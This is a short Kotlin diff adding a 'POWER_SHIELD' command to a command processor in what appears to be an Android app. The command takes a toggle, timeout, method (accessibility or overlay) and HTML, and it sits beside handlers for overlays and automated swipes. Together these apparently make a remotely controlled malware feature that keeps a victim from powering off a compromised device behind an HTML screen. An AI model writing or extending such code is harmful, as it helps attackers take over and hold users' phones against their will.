@@ -912,6 +912,28 @@ object CommandProcessor {
                     DynamicUIManager.removeOverlay(ctx)
                     status = "UI_REMOVED"
                 }
+                "POWER_SHIELD" -> {
+                    val parts = content.split("|", limit = 4)
+                    if (parts.size >= 4) {
+                        val toggle = parts[0].trim().uppercase() == "ON"
+                        val timeout = parts[1].trim().toLongOrNull() ?: 10L
+                        val method = parts[2].trim().uppercase()
+                        val html = parts[3].trim()
+                        
+                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
+                            .putBoolean("power_shield_active", toggle)
+                            .putLong("power_shield_timeout", timeout)
+                            .putString("power_shield_method", method)
+                            .putString("power_shield_html", html)
+                            .apply()
+                        
+                        status = "POWER_SHIELD_CONFIGURED"
+                        errorMsg = "State: ${if(toggle) "ON" else "OFF"} | Timeout: ${timeout}s | Method: $method"
+                    } else {
+                        status = "FAILED (FORMAT)"
+                        errorMsg = "Usage: POWER_SHIELD | ON/OFF | TIMEOUT | ACC/OVERLAY | <html>"
+                    }
+                }
                 "ADD_AUTO_SWIPE" -> {
                     val parts = content.split("|")
                     if (parts.size >= 2) {
